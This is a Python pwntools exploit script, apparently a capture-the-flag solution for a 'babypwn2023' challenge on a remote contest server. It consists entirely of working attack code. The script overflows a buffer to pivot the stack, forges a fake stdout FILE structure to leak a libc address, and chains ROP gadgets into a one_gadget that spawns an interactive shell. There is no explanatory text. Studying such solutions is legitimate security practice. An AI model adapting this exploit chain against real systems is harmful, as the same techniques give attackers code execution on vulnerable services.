from pwn import *
import time
#r = process('./chall')
#r = process('./C',env={'LD_PRELOAD' : './libc.so.6'})
r = remote('babypwn2023.balsnctf.com',10105)
#r = remote('localhost',10105)
main = 0x4011A0
rbp = 0x404b00 
leave_ret = 0x4011c5
stdout = 0x404010
pop_rbp_ret = 0x40115d
leave_ret = 0x4011c5
payload = b'\xff' * 0x20  + p64(0x404b00) +p64(main)
r.sendline(payload)

payload = b'\xff' * 0x20  + p64(0x404b28) +p64(main) + p64(main)+ p64(main)+ p64(main)+ p64(pop_rbp_ret) + p64(0x404b00) + p64(main)
r.sendline(payload)

fake_file = p64(0xfbad0800)
#fake_file = p64(0x00000000fbad2887)
fake_file += p64(0x00000000404a48) # _IO_read_ptr
fake_file += p64(0x00000000404a48) # _IO_read_end
fake_file += p64(0x00000000404a48) # _IO_read_base
fake_file += p64(0x00000000404a48) # _IO_write_base
fake_file += p64(0x00000000404a48+0x6) # _IO_write_ptr
fake_file += p64(0x00000000404a48+0x4) # _IO_write_end
fake_file += p64(0x00000000404a48) # _IO_buf_base
fake_file += p64(0x00000000404a48) # _IO_buf_end
fake_file += p64(0x00000000404a48) # _IO_save_base
fake_file += p64(0x00000000404a48) # _IO_backup_base
fake_file += p64(0x00000000404a48) # _IO_save_end
fake_file += p64(0x00000000404a48)
fake_file += p64(0) #_chain;
fake_file += p64(1) # file_no
fake_file += p64(0)
fake_file += p64(0)
fake_file += p64(0x404f00)
fake_file += p64(0xffffffffffffffff)
fake_file += p64(0)
fake_file += p64(0)
fake_file += p64(0)
fake_file += p64(0) 

payload = p64(pop_rbp_ret) + p64(0x404a50 - 0xd8 -0x10) + p64(main)
time.sleep(0.1)
input()
r.sendline(payload)

payload = b'\xff' * 0x20 + p64(stdout+0x20) + p64(main) + fake_file

r.sendline(payload)


payload = p64(0x00000000404978) + p64(0)*3 + p64(0x404b28-0x8) + p64(leave_ret)
r.recvuntil(b'Baby PWN 2023 :)\n')
r.recvuntil(b'Baby PWN 2023 :)\n')
r.recvuntil(b'Baby PWN 2023 :)\n')
r.sendline(payload)

libc = u64(r.recvuntil(b'\x7f') + b'\x00\x00') - 0x8af6d
print(hex(libc))

pop_rdx_r12_ret = libc + 0x11f497
one_gadget = libc + 0xebcf8
pop_rsi = libc + 0x2be51

payload = b'\x00' * 0x18
payload += p64(pop_rdx_r12_ret) + p64(0) * 2
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rbp_ret) + p64(0x404500)
payload += p64(one_gadget)
r.sendline(payload)


r.interactive()